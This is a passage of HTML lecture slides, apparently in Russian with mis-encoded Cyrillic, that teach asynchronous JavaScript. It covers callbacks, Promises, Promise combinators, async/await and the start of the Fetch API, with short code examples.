		<img class="place" src="callbackHell.png" style="transform-origin: center;transform: translate(-50%,-50%) scale(1.25);">
	</div>
</section>

<section class="slide">
	<h2>–ò–∑–±–∞–≤–ª—è–µ–º—Å—è –æ—Ç –ø–∏—Ä–∞–º–∏–¥</h2>
	<!--
	–∫–∞–∫ —Ç–æ–ª—å–∫–æ –º—ã –æ—Å–æ–∑–Ω–∞–ª–∏ —á—Ç–æ –ø–∏—Ä–∞–º–∏–¥—ã —ç—Ç–æ –ø–ª–æ—Ö–æ
	—Ö–æ—á–µ—Ç—Å—è –æ—Ç –Ω–∏—Ö –∏–∑–±–∞–≤–∏—Ç—å—Å—è

	—Å–¥–µ–ª–∞—Ç—å —ç—Ç–æ –º–æ–∂–Ω–æ –Ω–∞–ø—Ä–∏–º–µ—Ä —Ç–∞–∫:

	–≤—ã–Ω–æ—Å–∏–º –∫–æ–ª–±–µ–∫–∏ –∫–∞–∫ –æ—Ç–¥–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
	–ø—Ä–∏–¥—É–º—ã–≤–∞–µ–º –∞–¥–µ–∫–≤–∞—Ç–Ω—ã–µ –Ω–∞–∑–≤–∞–Ω–∏—è

	—Ä–∞—Å–ø–æ–ª–æ–∂–∏—Ç—å –∏—Ö –ø—Ä–∏ —ç—Ç–æ–º –º–æ–∂–Ω–æ –≤ –ø–æ—Ä—è–¥–∫–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–µ–Ω–∏—è (JS —ç—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç)
	–∏–ª–∏ –ø–æ —Å—Ç–∞—Ä–∏–Ω–∫–µ —Å–ª–µ–¥—É—è –ø—Ä–∞–≤–∏–ª—É "–Ω–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–æ –æ–±—ä—è–≤–ª–µ–Ω–∏—è"

	–ø–∏—Ä–∞–º–∏–¥ –±–æ–ª—å—à–µ –Ω–µ—Ç –Ω–æ callback-–∏ –æ—Å—Ç–∞–ª–∏—Å—å
	-->
	<pre class="hljs js">
		<code>http.ajaxPost('/signup', user, <mark>onSignup</mark>);</code>
		<code> </code>
		<code>function onSignup (err, resp1) {</code>
		<code>    if (err) { return console.error(err); }</code>
		<code>    http.ajaxGet(`/users/${resp1.id}`, <mark>onLoadUser</mark>);</code>
		<code>}</code>
		<code> </code>
		<code>function onLoadUser (err, resp2) {</code>
		<code>    if (err) { return console.error(err); }</code>
		<code>    http.ajaxGet(`/photos/${resp2.avatarId}`, <mark>onLoadAvatar</mark>);</code>
		<code>}</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>Try, catch</h2>
	<p class="medium-content"></p>
	<pre class="hljs js">
		<code>try {</code>
		<code>    // –í—ã–±—Ä–∞—Å—ã–≤–∞–µ–º –∏—Å–∫–ª—é—á–µ–Ω–∏–µ –≤—Ä—É—á–Ω—É—é</code>
  		<code>    throw 'Ooops!';</code>
		<code>} catch (err) {</code>
		<code>    alert(err); // –ü—Ä–∏–≤–µ—Ç, —è –æ—à–∏–±–∫–∞!</code>
		<code>}</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>–ê—Å–∏–Ω—Ö—Ä–æ–Ω–Ω—ã–µ –æ—à–∏–±–∫–∏</h2>
	<pre class="hljs js">
		<code>try {</code>
		<code>    http.ajaxGet('/user', function (err) {</code>
		<code>        if (err) {</code>
		<code>            throw err;</code>
		<code>        }</code>
		<code>        console.log('User is', user);</code>
		<code>    });</code>
		<code>} catch (err) {</code>
		<code>    alert(err); // –ù–µ –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è</code>
		<code>}</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>–ê—Å–∏–Ω—Ö—Ä–æ–Ω–Ω—ã–µ –æ—à–∏–±–∫–∏</h2>
	<pre class="hljs js">
		<code>const callback = function (err) {</code>
		<code>    if (err) {</code>
		<code>        throw err;</code>
		<code>    }</code>
		<code>    console.log('User is', user);</code>
		<code>};</code>
		<code> </code>
		<code>try {</code>
		<code>    http.ajaxGet('/user', callback);</code>
		<code>} catch (err) {</code>
		<code>    alert(err); // –ù–µ –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è</code>
		<code>}</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<!--
	—Ä–∞—Å—Å–∫–∞–∑ –ø—Ä–æ —Ç–æ –∫–æ–≥–¥–∞ –∏ –∑–∞—á–µ–º –ø—Ä–∏–¥—É–º–∞–ª–∏ Promise
	-->
	<h2>Futures –∏–ª–∏ Promises</h2>
	<p class="small-content">–¢–µ—Ä–º–∏–Ω <mark>promise</mark> –±—ã–ª –ø—Ä–µ–¥–ª–æ–∂–µ–Ω –≤ 1976 –≥–æ–¥—É –î—ç–Ω–∏—ç–ª–æ–º –§—Ä–∏–¥–º–∞–Ω–æ–º –∏ –î—ç–≤–∏–¥–æ–º –í–∞–π–∑–æ–º, –∞ –ü–∏—Ç–µ—Ä –•–∏–±–±–∞—Ä–¥ –Ω–∞–∑–≤–∞–ª –µ–≥–æ <mark>eventual</mark>. –ü–æ—Ö–æ–∂–∞—è –∫–æ–Ω—Ü–µ–ø—Ü–∏—è –ø–æ–¥ –Ω–∞–∑–≤–∞–Ω–∏–µ–º <mark>future</mark> –±—ã–ª–∞ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∞ –≤ 1977 –≥–æ–¥—É –≤ —Å—Ç–∞—Ç—å–µ –ì–µ–Ω—Ä–∏ –ë–µ–π–∫–µ—Ä–∞ –∏ –ö–∞—Ä–ª–∞ –•—å—é–∏—Ç—Ç–∞</p>
</section>

<section class="slide">
	<!--
	–í –ø–µ—Ä–µ–≤–æ–¥–µ —Å –∏–Ω–æ—Å—Ç—Ä–∞–Ω–Ω–æ–≥–æ "Promise" –æ–∑–Ω–∞—á–µ—Ç "–û–±–µ—â–∞–Ω–∏–µ".

	–ê–Ω–∞–ª–æ–≥–∏—è –ø—Ä–æ –≤–æ–ø—Ä–æ—Å—ã –æ –≤—Ä–µ–º–µ–Ω–∏:
	- –Ø –º–æ–≥—É —Å–ø—Ä–æ—Å–∏—Ç—å –∫–æ–≥–æ-–Ω–∏–±—É–¥—å –æ —Ç–æ–º –∫–æ—Ç–æ—Ä—ã–π —á–∞—Å - —ç—Ç–æ "—Å–∏–Ω—Ö—Ä–æ–Ω–Ω—ã–π" –≤—ã–∑–æ–≤
	- –Ø –º–æ–≥—É –ø–æ–ø—Ä–æ—Å–∏—Ç—å —Å–∫–∞–∑–∞—Ç—å –º–Ω–µ –∫–æ–≥–¥–∞ –ø—Ä–æ–π–¥–µ—Ç 5 –º–∏–Ω—É—Ç - —ç—Ç–æ –±—É–¥–µ—Ç "callback"
	- –Ø –º–æ–≥—É –ø–æ–ø—Ä–æ—Å–∏—Ç—å –∞ –∑–∞—Ç–µ–º —Å–∫–∞–∑–∞—Ç—å –≤—Å–µ–º —á—Ç–æ —ç—Ç–æ—Ç —á–µ–ª–æ–≤–µ–∫ –û–ë–ï–©–ê–õ
	  —Å–∫–∞–∑–∞—Ç—å –∫–æ–≥–¥–∞ –ø—Ä–æ–π–¥–µ—Ç 5 –º–∏–Ω—É—Ç - –æ–±–µ—â–∞–Ω–∏–µ

	–¢.–µ. –æ–±–µ—â–∞–Ω–∏–µ —ç—Ç–æ –æ—Ç–¥–µ–ª—å–Ω–∞—è —Å—É—â–Ω–æ—Å—Ç—å, –∫–æ—Ç–æ—Ä–æ–π –º–æ–∂–Ω–æ –ø–æ–¥–µ–ª–∏—Ç—å—Å—è —Å –¥—Ä—É–≥–∏–º–∏
	-->
	<h2>–ß—Ç–æ —Ç–∞–∫–æ–µ Promise?</h2>
	<div style="position:relative;width: 100%; height: 75%;">
		<img class="place" src="promise.jpg" style="transform-origin: center;transform: translate(-50%,-50%) scale(0.8);">
	</div>
</section>

<section class="slide">
	<h2>Promise</h2>
	<blockquote>
		<p><b>Promise (–æ–±–µ—â–∞–Ω–∏–µ)</b> &mdash; –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –æ–±–µ—Ä—Ç–∫—É –¥–ª—è –∑–Ω–∞—á–µ–Ω–∏—è, –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–≥–æ –Ω–∞ –º–æ–º–µ–Ω—Ç —Å–æ–∑–¥–∞–Ω–∏—è –æ–±–µ—â–∞–Ω–∏—è</p>
	</blockquote>
	<p class="note">–û–Ω –ø–æ–∑–≤–æ–ª—è–µ—Ç –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏–π —Ç–∞–∫, –∫–∞–∫ –µ—Å–ª–∏ –±—ã –æ–Ω–∏ –±—ã–ª–∏ —Å–∏–Ω—Ö—Ä–æ–Ω–Ω—ã–º–∏: –≤–º–µ—Å—Ç–æ –∫–æ–Ω–µ—á–Ω–æ–≥–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞ –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ–≥–æ –º–µ—Ç–æ–¥–∞ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç—Å—è –æ–±–µ—â–∞–Ω–∏–µ –ø–æ–ª—É—á–∏—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç –≤ –Ω–µ–∫–æ—Ç–æ—Ä—ã–π –º–æ–º–µ–Ω—Ç –≤ –±—É–¥—É—â–µ–º</p>
</section>

<section class="slide">
	<h2>Promise</h2>
	<blockquote>
		<p><b>Promises (–ø—Ä–æ–º–∏—Å—ã)</b> &mdash; —ç—Ç–æ —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–µ –æ–±—ä–µ–∫—Ç—ã, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –æ–¥–Ω–æ–º –∏–∑ —Ç—Ä—ë—Ö —Å–æ—Å—Ç–æ—è–Ω–∏–π:
		<ul>
			<li>–≤–Ω–∞—á–∞–ª–µ <strong>pending</strong> (¬´–æ–∂–∏–¥–∞–Ω–∏–µ¬ª)</li>
			<li>–∑–∞—Ç–µ–º –ª–∏–±–æ <strong>fulfilled</strong> (¬´–≤—ã–ø–æ–ª–Ω–µ–Ω–æ —É—Å–ø–µ—à–Ω–æ¬ª)</li>
			<li>–ª–∏–±–æ <strong>rejected</strong> (¬´–≤—ã–ø–æ–ª–Ω–µ–Ω–æ —Å –æ—à–∏–±–∫–æ–π¬ª)</li>
		</ul>
		</p>
	</blockquote>
	<div style="position:relative;width: 100%; height: 40%;">
		<img class="place" src="promiseInit.png" style="transform-origin: center;transform: translate(-50%,-50%) scale(1.6);">
	</div>
</section>

<section class="slide">
	<h2>Promise</h2>
	<pre class="hljs js">
		<code>const promise = new Promise(function(resolve, reject) {</code>
		<code>    // –ó–¥–µ—Å—å –º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω—è—Ç—å –ª—é–±—ã–µ –¥–µ–π—Å—Ç–≤–∏—è</code>
		<code> </code>
		<code>    // –≤—ã–∑–æ–≤ resolve(result) –ø–µ—Ä–µ–≤–µ–¥—ë—Ç –ø—Ä–æ–º–∏—Å –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–µ <mark>fulfilled</mark></code>
		<code>    // –≤—ã–∑–æ–≤ reject(error) –ø–µ—Ä–µ–≤–µ–¥—ë—Ç –ø—Ä–æ–º–∏—Å –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–µ <mark>rejected</mark></code>
		<code>});</code>
		<code> </code>
		<code>// –ú–æ–∂–Ω–æ —Å–æ–∑–¥–∞—Ç—å —Å—Ä–∞–∑—É "–≥–æ—Ç–æ–≤—ã–π" –ø—Ä–æ–º–∏—Å</code>
		<code>const fulfilled = Promise.resolve(result);</code>
		<code>// const fulfilled = new Promise((resolve, _) => resolve(result));</code>
		<code>const rejected = Promise.reject(error);</code>
		<code>// const rejected = new Promise((_, reject) => reject(error));</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>Promise</h2>
	<p>–û—Å–Ω–æ–≤–Ω–æ–π —Å–ø–æ—Å–æ–± –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å –ø—Ä–æ–º–∏—Å–æ–º —ç—Ç–æ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è —Ñ—É–Ω–∫—Ü–∏–π –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∫–æ–Ω–µ—á–Ω–æ–≥–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞ –ø—Ä–æ–º–∏—Å–∞ –∏–ª–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –æ –ø—Ä–∏—á–∏–Ω–µ, –ø–æ –∫–æ—Ç–æ—Ä–æ–π –æ–Ω –Ω–µ –±—ã–ª –≤—ã–ø–æ–ª–Ω–µ–Ω. –ò–Ω—ã–º–∏ —Å–ª–æ–≤–∞–º–∏, –Ω–∞ –ø—Ä–æ–º–∏—Å—ã –º–æ–∂–Ω–æ –Ω–∞–≤–µ—Å–∏—Ç—å –¥–≤–∞ –∫–æ–ª–ª–±–µ–∫–∞:</p>
	<ul>
		<li><code>onFulfilled</code> &mdash; —Å—Ä–∞–±–∞—Ç—ã–≤–∞—é—Ç, –∫–æ–≥–¥–∞ promise –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏ ¬´–≤—ã–ø–æ–ª–Ω–µ–Ω —É—Å–ø–µ—à–Ω–æ¬ª</li>
		<li><code>onRejected</code> &mdash; —Å—Ä–∞–±–∞—Ç—ã–≤–∞—é—Ç, –∫–æ–≥–¥–∞ promise –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏ ¬´–≤—ã–ø–æ–ª–Ω–µ–Ω —Å –æ—à–∏–±–∫–æ–π¬ª</li>
	</ul>
</section>

<section class="slide">
	<h2>Promise</h2>
	<pre class="hljs js">
		<code>const promise = new Promise( ... );</code>
		<code> </code>
		<code>// –ú–æ–∂–Ω–æ –Ω–∞–≤–µ—Å–∏—Ç—å –∏—Ö –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ</code>
		<code>promise.then(onFulfilled, onRejected);</code>
		<code> </code>
		<code>// –ú–æ–∂–Ω–æ –ø–æ –æ—Ç–¥–µ–ª—å–Ω–æ—Å—Ç–∏</code>
		<code>// –¢–æ–ª—å–∫–æ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ onFulfilled</code>
		<code>promise.then(onFulfilled);</code>
		<code>// –¢–æ–ª—å–∫–æ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ onRejected</code>
		<code>promise.then(null, onRejected);</code>
		<code>promise.catch(onRejected); // –ò–ª–∏ —Ç–∞–∫</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>Promise</h2>
	<pre class="hljs js">
		<code>const promise = new Promise(function(resolve, reject) {</code>
		<code>    // do smth</code>
		<code>    resolve('success'); // or</code>
		<code>    // reject(new Error('failure'));</code>
		<code>});</code>
		<code> </code>
		<code>promise</code>
		<code>    <mark>.then</mark>(res => console.log(res))</code>
		<code>    <mark>.catch</mark>(err => console.error(err));</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<!--
	–≠—Ç–æ—Ç –Ω–µ–±–æ–ª—å—à–æ–π —Ç—Ä—é–∫ –¥–∞—Ä–∏—Ç –Ω–∞–º –º–Ω–æ–≥–æ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–µ–π
	–¥–ª—è –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏ –Ω–∞—à–µ–≥–æ –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ–≥–æ –∫–æ–¥–∞

	–ü–µ—Ä–µ—á–∏—Å–ª—è—é –∏ —Ä–∞—Å—Å–∫–∞–∑—ã–≤–∞—é –ø–µ—Ä–≤—ã–µ —Ç—Ä–∏ –ø—É–Ω–∫—Ç–∞, –Ω–∞ –ø–æ—Å–ª–µ–¥–Ω–µ–º —Å–∫–∏–ø–∞—é –∫ —Å–ª–µ–¥ —Å–ª–∞–π–¥—É
	-->
	<h2>–ö–∞–∫–∞—è –ø–æ–ª—å–∑–∞ –æ—Ç –ø—Ä–æ–º–∏—Å–æ–≤?</h2>
	<p class="small-content"></p>
	<ul>
		<li>–ú–æ–∂–Ω–æ –Ω–∞–≤–µ—à–∏–≤–∞—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤-–∫–æ–ª–±—ç–∫–æ–≤</li>
		<li>–ú–æ–∂–Ω–æ –Ω–∞–≤–µ—Å–∏—Ç—å –æ–±—Ä–∞–±–æ—Ç—á–∏–∫-–∫–æ–ª–±—ç–∫ –ø–æ—Ç–æ–º</li>
		<li>–ú–æ–∂–Ω–æ –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å –ø—Ä–æ–º–∏—Å—ã –≤ –∫–∞—á–µ—Å—Ç–≤–µ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤ –≤ –¥—Ä—É–≥–∏–µ —á–∞—Å—Ç–∏ —Å–∏—Å—Ç–µ–º—ã</li>
		<li>–ú–æ–∂–Ω–æ —Å—Ç—Ä–æ–∏—Ç—å —Ü–µ–ø–æ—á–∫–∏ –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ –±–µ–∑ callback hell</li>
	</ul>
</section>

<section class="slide">
	<h2>–î–æ–±–∞–≤–ª–µ–Ω–∏–µ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –∫–æ–ª–ª–±—ç–∫–æ–≤</h2>
	<pre class="hljs js">
		<code>// 'cb1 success', 'cb2 success'</code>
		<code>const promise = Promise.resolve('success');</code>
		<code> </code>
		<code>promise.then(res => { console.log('cb1', res); }); // 1</code>
		<code>promise.then(res => { console.log('cb2', res); }); // 2</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>–ß–µ–π–Ω–∏–Ω–≥ –ø—Ä–æ–º–∏—Å–æ–≤</h2>
	<pre class="hljs js">
		<code>// 'value 1', 'value 2', 'value 3'</code>
		<code>const promise = Promise.resolve('value 1');</code>
		<code> </code>
		<code>const p2 = promise</code>
		<code>    .then(res => { console.log(res); return 'value 2'; }) // 1</code>
		<code>    .then(res => { console.log(res); return 'value 3'; }) // 2</code>
		<code>    .then(res => { console.log(res); });                  // 3</code>
		<code> </code>
		<code>p2 === promise // false</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>–û–±—Ä–∞–±–æ—Ç–∫–∞ –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω—ã—Ö –æ—à–∏–±–æ–∫</h2>
	<pre class="hljs js">
		<code>// 'value 1', 'Error!', 'Error catched!'</code>
		<code>const promise = Promise.resolve('value 1');</code>
		<code> </code>
		<code>promise</code>
		<code>    .then(res => { console.log(res); throw 'Error!'; })             // 1</code>
		<code>    .then(res => { console.log('foo'); })</code>
		<code>    .then(res => { console.log('bar'); })</code>
		<code>    .then(res => { console.log('baz'); })</code>
		<code>    .catch(err => { console.error(err); return 'Error catched!'; }) // 2</code>
		<code>    .then(res => { console.log(res); });                            // 3</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>–ò–∑ –ø—Ä–æ–º–∏—Å–∞ –º–æ–∂–Ω–æ –≤–æ–∑–≤—Ä–∞—â–∞—Ç—å<br/>–ø—Ä–æ–º–∏—Å!</h2>
	<pre class="hljs js">
		<code>// 'foo', 'baz', 'bar', 'foobar'</code>
		<code>const promise1 = Promise.resolve('foo')</code>
		<code>    .then(res => { console.log(res); return 'bar'; });    // foo</code>
		<code> </code>
		<code>const promise2 = Promise.resolve('baz')</code>
		<code>    .then(res => { console.log(res); <mark>return promise1</mark>; })  // baz</code>
		<code>    .then(res => { console.log(res); return 'foobar'; })  // bar</code>
		<code>    .then(res => { console.log(res); });                  // foobar</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>–ü—Ä–æ–º–∏—Å–∏—Ñ–∏–∫–∞—Ü–∏—è</h2>
	<blockquote>
		<p>–û–±–æ—Ä–∞—á–∏–≤–∞–Ω–∏–µ <strong>–∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ–≥–æ —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª–∞</strong> –≤ —Ñ—É–Ω–∫—Ü–∏—é, –≤–æ–∑–≤—Ä–∞—â–∞—é—â—É—é –ø—Ä–æ–º–∏—Å</p>
	</blockquote>
	<pre class="hljs js">
		<code>function PromiseGet(url) {</code>
		<code>    return new Promise(function (resolve, reject) {</code>
		<code>        http.Get(url, function (err, response) {</code>
		<code>            if (err) { reject(err) }</code>
		<code>            resolve(response);</code>
		<code>        });</code>
		<code>    });</code>
		<code>}</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>Callback Hell!</h2>
	<pre class="hljs js">
		<code>http.ajaxPost('/signup', user, function (err, resp1) {</code>
		<code>    if (err) { return console.error(err); }</code>
		<code>    http.ajaxGet(`/users/${resp1.id}`, function (err, resp2) {</code>
		<code>        if (err) { return console.error(err); }</code>
		<code>        http.ajaxGet(`/photos/${resp2.avatarId}`, function (err, avatar) {</code>
		<code>            if (err) { return console.error(err); }</code>
		<code>            // ... callback hell!</code>
		<code>        });</code>
		<code>    });</code>
		<code>});</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2><s>Callback Hell!</s> –ö—Ä–∞—Å–æ—Ç–∞ :)</h2>
	<pre class="hljs js">
		<code>PromisePost('/signup', user)</code>
		<code>    .then(resp1 => PromiseGet(`/users/${resp1.id}`))</code>
		<code>    .then(resp2 => PromiseGet(`/photos/${resp2.avatarId}`))</code>
		<code>    .then(avatar => { ... })</code>
		<code>    .catch(err => console.error(err));</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2><code>Promise.all</code></h2>
	<pre class="hljs js">
		<code>// –î–µ–ª–∞–µ–º —á—Ç–æ-–Ω–∏–±—É–¥—å –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ–µ –∏ –≤–∞–∂–Ω–æ–µ –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ</code>
		<code>Promise.all([</code>
		<code>	  PromiseGet('/user/1'),</code>
		<code>	  PromiseGet('/user/2'),</code>
		<code>]).then(function(users) {</code>
		<code>	  // –†–µ–∑—É–ª—å—Ç–∞—Ç–æ–º —Å—Ç–∞–Ω–µ—Ç –º–∞—Å—Å–∏–≤ –∏–∑ –∑–Ω–∞—á–µ–Ω–∏–π –≤—Å–µ—Ö –ø—Ä–æ–º–∏—Å–æ–≤</code>
		<code>	  users.forEach(function(user, i) {</code>
		<code>	  	  console.log(`User #${i}: ${value}`);</code>
		<code>	  });</code>
		<code>});</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2><code>Promise.race</code></h2>
	<pre class="hljs js">
		<code>// –î–µ–ª–∞–µ–º —á—Ç–æ-–Ω–∏–±—É–¥—å –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ–µ –∏ –≤–∞–∂–Ω–æ–µ –Ω–∞–ø–µ—Ä–µ–≥–æ–Ω–∫–∏!</code>
		<code>Promise.race([</code>
		<code>	  promiseSomething(),</code>
		<code>	  promiseSomethingElse()</code>
		<code>]).then(function(result) {</code>
		<code>	  // –†–µ–∑—É–ª—å—Ç–∞—Ç–æ–º —Å—Ç–∞–Ω–µ—Ç –∑–Ω–∞—á–µ–Ω–∏–µ —Å–∞–º–æ–≥–æ "–±—ã—Å—Ç—Ä–æ–≥–æ" –ø—Ä–æ–º–∏—Å–∞</code>
		<code>	  console.log(`Result: ${value}`);</code>
		<code>});</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2><code>Promise.any</code></h2>
	<pre class="hljs js">
		<code>// –≤–µ—Ä–Ω–µ—Ç –ø–µ—Ä–≤–æ–µ fulfilled, –ª–∏–±–æ –±—É–¥–µ—Ç rejected —Å –º–∞—Å—Å–∏–≤–æ–º –ø—Ä–∏—á–∏–Ω</code>
		<code>const promises = [	</code>
		<code>  Promise.reject('ERROR A'),</code>
		<code>  Promise.reject('ERROR B'),</code>
		<code>  Promise.resolve('result'),</code>
		<code>]</code>
		<code>Promise.any(promises)</code>
		<code>  .then((result) => console.log(result));</code>
		<code>  // result</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2><code>Promise.allSettled</code></h2>
	<p>–ú–µ—Ç–æ–¥ Promise.allSettled() –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –ø—Ä–æ–º–∏—Å, –∫–æ—Ç–æ—Ä—ã–π –∏—Å–ø–æ–ª–Ω—è–µ—Ç—Å—è –∫–æ–≥–¥–∞ –≤—Å–µ –ø–æ–ª—É—á–µ–Ω–Ω—ã–µ –ø—Ä–æ–º–∏—Å—ã –∑–∞–≤–µ—Ä—à–µ–Ω—ã (–∏—Å–ø–æ–ª–Ω–µ–Ω—ã –∏–ª–∏ –æ—Ç–∫–ª–æ–Ω–µ–Ω—ã), —Å–æ–¥–µ—Ä–∂–∞—â–∏–π –º–∞—Å—Å–∏–≤ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –∏—Å–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª—É—á–µ–Ω–Ω—ã—Ö –ø—Ä–æ–º–∏—Å–æ–≤.</p>
	<pre class="hljs js">
		<code>const promise1 = Promise.resolve(3);</code>
		<code>const promise2 = new Promise(</code>
		<code>   (resolve, reject) => setTimeout(reject, 100, 'foo')</code>
		<code>);</code>
		<code>const promises = [promise1, promise2];</code>
		<code>Promise.allSettled(promises).</code>
		<code>  then((results) => results.forEach((result) => console.log(result.status)));</code>
		<code>	  // "fulfilled", "rejected"</code>
		<code>    // –¢—Ä–µ—Ç–∏–π –∞—Ä–≥—É–º–µ–Ω—Ç—ã –≤ setTimeout?</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>Async</h2>
	<pre class="hljs js">
		<code>async function f() {</code>
		<code>    return 1;</code>
		<code>}</code>
		<code>// async-—Ñ—É–Ω–∫—Ü–∏–∏ –≤—Å–µ–≥–¥–∞ –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç promise</code>
		<code></code>
	</pre>
</section>

<section class="slide">
	<h2>Async</h2>
	<pre class="hljs js">
		<code>async function f1() {</code>
		<code>    return 1;</code>
		<code>}</code>
		<code></code>
		<code>async function f2() {</code>
		<code>    return Promise.resolve(1);</code>
		<code>}</code>
		<code>f1().then(console.log) // 1</code>
		<code>f2().then(console.log) // 1</code>
	</pre>
</section>

<section class="slide">
	<h2>Async/Await</h2>
	<pre class="hljs js">
		<code>// await –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∏ –∂–¥–µ—Ç —Ä–µ–∑–æ–ª–≤–∞</code>
		<code>let value = await promise;</code>
		<code></code>
		<code>async function f() {</code>
		<code>  let p = new Promise((resolve)=> setTimeout(()=>resolve('done'), 1000))</code>
		<code>  let result = await p; // –±—É–¥–µ—Ç –∂–¥–∞—Ç—å 1—Å–µ–∫</code>
		<code>  	console.log(result)</code>
		<code>}</code>
		<code>// await <strong>–Ω–µ–ª—å–∑—è</strong> –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤ –æ–±—ã—á–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏—è—Ö</code>
	</pre>
</section>

<section class="slide">
	<h2>Async/Await. –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫</h2>
	<pre class="hljs js">
		<code>// –æ–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫</code>
		<code>async function f() {</code>
		<code>  await Promise.reject(new Error('Oops')); // throw new Error('Oops');</code>
		<code>}</code>
		<code>// –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å try-catch –∫–∞–∫ –≤ —Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ–º –±–ª–æ–∫–µ</code>
		<code></code>
	</pre>
</section>

<section class="slide">
	<h2>Async/Await. –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫</h2>
	<pre class="hljs js">
		<code>// –æ–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫</code>
		<code>async function f() {</code>
		<code>  try {</code>
		<code>    let response = await throwable();</code>
		<code>  } catch (error) {</code>
		<code>    console.log(error); // gotcha! ü§†</code>
		<code>  }</code>
		<code>}</code>
		<code></code>
	</pre>
</section>


<section class="slide">
	<h2>Fetch API</h2>
	<blockquote>
		<p>
			–ú–µ—Ç–æ–¥ <mark>fetch</mark> &mdash; —ç—Ç–æ <mark>XMLHttpRequest</mark> –Ω–æ–≤–æ–≥–æ –ø–æ–∫–æ–ª–µ–Ω–∏—è.
